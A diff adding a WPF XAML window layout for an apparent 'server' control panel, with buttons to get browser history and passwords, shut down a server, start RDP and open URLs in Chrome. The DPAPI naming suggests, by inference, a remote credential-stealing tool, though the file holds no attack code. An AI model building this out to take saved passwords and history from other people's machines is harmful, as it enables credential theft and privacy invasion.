@@ -1,0 +1,25 @@
+﻿<Window x:Class="DPAPI___Wpf.Window1"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="clr-namespace:DPAPI___Wpf"
+        mc:Ignorable="d"
+        Title="Server ft. Ishay" Height="550" Width="1050" ResizeMode="NoResize">
+    <Grid>
+        <Button x:Name="BtnGetData" Content="Get History&#xD;&#xA;" HorizontalAlignment="Left" VerticalAlignment="Top" Width="124" Margin="289,75,0,0" Height="60" Click="BtnGetData_Click"/>
+        <Button x:Name="btnGetPasswords" Click="btnGetPasswords_Click"  Content="Get Passwords" HorizontalAlignment="Left" VerticalAlignment="Top" Width="106" Margin="656,75,0,0" Height="60"/>
+        <DataGrid x:Name="gv" HorizontalAlignment="Left" Height="282" VerticalAlignment="Top" Width="258" Margin="70,181,0,0"/>
+        <Button x:Name="btnShutServer" Content="Shut Down Server" HorizontalAlignment="Left" Height="60" Margin="464,75,0,0" VerticalAlignment="Top" Width="129" Click="btnShutServer_Click"/>
+        <Button x:Name="btnRDP" Content="Button" HorizontalAlignment="Left" Height="60" Margin="796,75,0,0" VerticalAlignment="Top" Width="119" Click="btnRDP_Click"/>
+        <TextBox x:Name="tbConnString" HorizontalAlignment="Left" Height="28" Margin="856,165,0,0" TextWrapping="Wrap" Text="TextBox" VerticalAlignment="Top" Width="82"/>
+        <Button Content="Button" HorizontalAlignment="Left" Height="28" Margin="639,165,0,0" VerticalAlignment="Top" Width="84" Click="Button_Click"/>
+        <Button x:Name="btnOpenUrl" Content="Open url" HorizontalAlignment="Left" Height="58" Margin="120,77,0,0" VerticalAlignment="Top" Width="120" Click="btnOpenUrl_Click"/>
+        <TextBox x:Name="tbChromeUrl" HorizontalAlignment="Left" Height="41" Margin="103,31,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="155"/>
+        <StackPanel>
+        <ProgressBar x:Name="pBarTransferBytes" HorizontalAlignment="Left" Height="29" Margin="520,238,0,0" VerticalAlignment="Top" Width="130"/>
+            <!--<TextBox x:Name="tbProgBar" Text="{Binding ElementName=pBarTransferBytes, Path=value}" />-->
+            <Label x:Name="lblProgBar" Content="{Binding ElementName=pBarTransferBytes, Path=Value}" />
+        </StackPanel>
+    </Grid>
+</Window>
